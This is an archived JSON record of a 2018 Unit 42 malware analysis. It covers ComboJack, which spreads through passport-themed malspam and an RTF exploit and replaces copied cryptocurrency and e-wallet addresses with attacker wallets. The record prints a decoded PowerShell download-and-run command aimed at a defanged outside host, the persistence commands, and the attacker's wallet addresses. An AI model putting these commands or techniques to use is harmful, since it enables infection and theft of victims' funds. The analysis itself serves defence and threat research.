{
    "id": "01965248-d044-40fa-b5a1-7704d86f71b9",
    "created_at": "2023-01-12T15:09:56.447214Z",
    "updated_at": "2025-03-27T02:06:04.177472Z",
    "deleted_at": null,
    "sha1_hash": "8a118c01ac553eb957e888f7d3bd772d72e9a5ed",
    "title": "2018-03-05 - Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency",
    "authors": "",
    "file_creation_date": "2022-05-28T15:12:06Z",
    "file_modification_date": "2022-05-28T15:12:06Z",
    "file_size": 447474,
    "plain_text": "# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency\n\n**researchcenter.paloaltonetworks.com/2018/03/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-**\ncryptocurrency/\n\nBrandon Levene, Josh Grunzweig March 5, 2018\n\nBy [Brandon Levene and](https://unit42.paloaltonetworks.com/author/brandon-levene/) [Josh Grunzweig](https://unit42.paloaltonetworks.com/author/joshgruznweig/)\n\nMarch 5, 2018 at 5:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [ComboJack,](https://unit42.paloaltonetworks.com/tag/combojack/) [Cryptocurrency,](https://unit42.paloaltonetworks.com/tag/cryptocurrency/) [Cryptoshuffler,](https://unit42.paloaltonetworks.com/tag/cryptoshuffler/) [CVE-2017-8579](https://unit42.paloaltonetworks.com/tag/cve-2017-8579/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/)\n\nSummary\n\nUnit 42 researchers have discovered a new currency stealer which targets cryptocurrencies\nand online wallets. \"CryptoJack\" functions by replacing clipboard addresses with an attackercontrolled address which sends funds into the attacker's wallet. This technique relies on\nvictims not checking the destination wallet prior to finalizing a transaction. In 2017,\nCryptoShuffler was the first malware to utilize this tactic. In contrast to that one, which focused\non numerous cryptocurrencies, ComboJack targets both a range of cryptocurrencies, as well\nas digital currencies such as WebMoney and Yandex Money.\n\nDetails\n\n[Early on the morning of February 25, 2018, Unit 42 and Proofpoint researchers observed an](https://www.proofpoint.com/us)\ninteresting malspam campaign targeting Japanese and American users. This particular\n\n\n-----\n\ncampaign tried to entice users by claiming a passport was lost and that the attached PDF\ncontained a scanned copy of the document.\n\n_Image 1. Example malspam recieved by users._\n\nUsers opening this PDF would find a single line of text which refers to an embedded doc file.\n\n_Figure 1 Prompt displayed to the victim when opening the embedded RTF file_\n\n[Similar to techniques utilized by Dridex and Locky in mid-2017, the PDF contained an](https://www.fireeye.com/blog/threat-research/2017/05/dridex_and_lockyret.html)\n[embedded RTF file which contains an embedded remote object that attacks CVE-2017-8579](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8579)\n\n\n-----\n\n[as discussed in this FireEye report.](https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html)\nThis embedded remote object is an HTA file which was located at hXXps://a.doko[.]moe/tnejln\nwhich contains encoded PowerShell commands.\n\n_Image 2. Contents of the HTA file retrieved from hXXps://a.doko[.]moe/tnejln_\n\nDecoding the contents of the HTA file yields the following PowerShell command which\ndownloads and executes a file:\n\n\n1\n2\n\n\nwscript.shell%systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe (newobject system.net.webclient).downloadfile(\nhXXp://masolo[.]win/protect/achi.exe $env:appdata\\bstest.exe) ; start\n$env:appdata\\bstest.exe\n\n\nThe full flow of execution may be visualized as follows:\n\n_Figure 2 Flow of execution leading to ComboJack being installed on victim_\n\nThat leads us to the payload, which we have dubbed ComboJack because of how it attempts\nto hijack a combination of digital currencies.\n\n\n-----\n\nComboJack\nThe following files were used for this analysis, which are explained below.\n\n\n**Initial File**\n**SHA256**\n\n**Second**\n**Stage**\n**SHA256**\n\n**Final**\n**Payload**\n**SHA256**\n\n\n9613aefc12880528040812b0ce9d3827d1c25fe66f8598eaef82c169e8ed02da\n\ncab010b59cf9d649106477df012ca49f939aa537910b56bfadbe1381b0484d88\n\n05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\n\n\nThe initially downloaded file is a self-extracting executable (SFX) with embedded commands\nfor extracting the second stage. This second stage is a password protected SFX, however, the\npassword is supplied by the first stage. This allows us to easily recover the contents of the\nsecond stage. Helpfully, the “setup.txt” from the first stage contains the following:\n\n_Image 3. Contents of setup.txt embedded in the first SFX layer of the payload._\n\nOnce the second stage is extracted and run, we are presented with the final stage of this\nattack, which we refer to as ComboJack. Once ComboJack is extracted it begins by copying\nitself to the following location:\n\n\n-----\n\n1 C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n\nIt then uses the built-in Windows tool, attrib.exe (used for setting file attributes), to set both\nhidden and system attributes to itself. This hides the file from the user and allows it to execute\nwith SYSTEM level privileges.\n\n1 \"cmd /k attrib +s +h \\\"C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\\\"\"\n\nFinally, the payload sets the following registry key to ensure persistence:\n\n1 HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\NVIDIA – C:\\\nProgramData\\NVIDIA\\NVDisplay.Container.exe\n\nWhen the above steps are completed, ComboJack enters into an infinite loop. Every half\nsecond it checks the contents of the clipboard. The contents of the clipboard are checked for\nvarious criteria to determine if the victim has copied wallet information for various digital\ncurrencies. In the event a wallet of interest is discovered, ComboJack will replace it with a\nhardcoded wallet that the attacker presumably owns in an attempt to have the victim\naccidentally send money to the wrong location. This tactic relies on the fact that wallet\naddresses are typically long and complex and to prevent errors, most users will opt to copy an\nexact string in order to prevent potential errors. If any potential currency addresses are found,\nthey are replaced following the criteria in the table below:\n\n\n**Checks**\n**for this**\n**criteria**\n\nLength\nof 42\nand\nstarts\nwith a\n‘0’\n\n\n**Replaces with** **Wallet Type**\n\n0xE44598AB74425450692F7b3a9f898119968da8Ad Ethereum\n\n\n-----\n\nLength\nof 106\nand\nstarts\nwith ‘4’\n\nLength\nof 34\nand\nstarts\nwith ‘1’\n\nLength\nof 34\nand\nstarts\nwith ‘L’\n\nLength\nof 11\nand\nstarts\nwith ‘8’\n\nLength\nof 13\nand\nstarts\nwith ‘R’\n\nLength\nof 13\nand\nstarts\nwith ‘Z’\n\n\n4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBE Monero. It's\nimportant to\nnote that\nthis\nreplacement\nstring is not\nlong\nenough, as\nMonero\nwallet\naddresses\nare either\n95 or 106\ncharacters\nin length.\nThis was\nlikely a\nmistake\nmade by the\nauthor.\n\n1LGskAycxvcgh6iAoigcvbwTtFjSfdod2x Bitcoin\n\nLYB56d6TeMg6VmahcgfTZSALAQRcNRQUV Litecoin\n\n79965017478 Qiwi\n\nR064565691369 WebMoney\n(Rubles)\n\nZ152913748562 WebMoney\n(USD)\n\n\n-----\n\nLength\nof 13\nand\nstarts\nwith ‘E’\n\nLength\nof 15\nand\nstarts\nwith\n‘4100’\n\n\n88888888888888888888888888888888888888888888888888 Unknown\n\n410014474125403 Yandex\nMoney\n\n\n_Table 1. Replacement address lookup table hardcoded into ComboJack._\n\n[ComboJack shares some similarities in basic functionality with CryptoShuffler, which is a](https://www.kaspersky.com/blog/cryptoshuffler-bitcoin-stealer/19976/)\nmalware family discovered by Kaspersky in 2017. However whereas CryptoShuffler focused\nexclusively on cryptocurrencies, ComboJack also targets popular digital payment systems,\nsuch as WebMoney (USD, EUR, and RUB), and Yandex Money.\n\nConclusion\nWith the proliferation of Cryptomining malware, it is curious to see some actors take a different\nroute to acquiring web-based currency. Cryptoshuffler in 2017 may have been only the\nbeginning of simple, yet effective clipboard stealers like ComboJack. By targeting multiple\ncryptocurrencies and web based wallets, the author of ComboJack appears to be hedging his\nor her bets on which currency will boom and which will bust. As the prices of cryptocurrencies\ncontinue to rise it is likely we will see more and more malware targeting cryptocurrencies, as it\npresents the fastest way to the highest profit.\nPalo Alto Networks WildFire customers are protected from this threat through the following\nways:\n\nComboJack malware is identified as malicious and blocked via the Traps and WildFire\nproducts\n[Customers may monitor and track ComboJack through the AutoFocus tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ComboJack)\n\nIOCs\n**Lure PDFs:**\ndd8ba88df50de86e7bb9b6343313e48e1e3b8d1a84ffca0a06a203a2f027cfdc\nd3a5313a0070b8400b0d661f2515a0eb83e4e6110b98e9ffb6618e457bf52714\n15e6984beea04bf2f26fbbe1e490c59d1f51ba7ad0dce3ac76cea21579ca694b\n325fd50143d6d975d9db18cf9a069c9107c3bfcad5a07653d53c0fc315ee27ab\n\n\n-----\n\n**Payload:**\nbd1b56b6814aae369b0593dfe71450e1b45cb288f752faa2622d1b189bc6b2d6\n228e8b728f7b714934f5ecfa6fd5de256d1d24f634a63f2fc4663c7cfb3b9d65\n05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\nd92b4c622d3524f6d5ce8fe53d802c6a0c51fd1f56ac2b554daac24d7b4fb8ef\n4d96d8cfefd9cc3f86bd3ab7f054f0b0acef726a4c349359bf44d22952b4744d\n85c27addbf3a7234ac1e2922002fdef216994708bdda28f2ad6d3a7a1b32934e\nea5eb17c32767486c1b3a8ee7a8eacefab125c93414cdea97348c2ee96752f7e\na6807cf5ed53b34cc9513defcde56c8a956c3d574ee9f300b3a763a7c8287081\n8d8f497313ed797090ef552d44198f8c21f0a6ed261b30902d4d37478cd2efeb\n47f14c24212c32e686f0b9162530c4b966c9cff907e1920c096ad81d078f20cd\n05cbc6b1e98bc6f8935f95454ba214cccaf3a36c497126512669daba59a407a0\n8a6f75a4a58bdafed085fd640681a4c94eee54f1bfb6e5eb6dcf8eb7524d2a2e\n2ee9a1c554a774925f83428a0822b901d7b3ed81c247cb0d038ecc188d9f9149\nd0f6dcdb4f749490a7ef678e9006474c885fbb3d8e396a5c8f2150441bb34782\na10a5666ce31c7a3de760f33d93bd924354e7bac1f07bde9e3ac3da8e250eb6d\n98e896586ea71f80a2b0024ec86133bfa5163f01f4faa1b1f380f0a2ea128c2f\nf9bff08960484d5c97f075090b9843dc1d54839a4dabc514e8f97f809e1ceaf5\nc1cc9448ee5684698f7891911821a9eb86f56be8852adef613b2fab4636e7b36\nece82af6fa1e94904d62e86fe86810fe85b058e56a311ca24ac7667409cff8c0\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-05 - Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency.pdf"
    ],
    "report_names": [
        "2018-03-05 - Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536196,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 1653750726,
    "ts_modification_date": 1653750726,
    "files": {
        "pdf": "https://archive.orkl.eu/8a118c01ac553eb957e888f7d3bd772d72e9a5ed.pdf",
        "text": "https://archive.orkl.eu/8a118c01ac553eb957e888f7d3bd772d72e9a5ed.txt",
        "img": "https://archive.orkl.eu/8a118c01ac553eb957e888f7d3bd772d72e9a5ed.jpg"
    }
}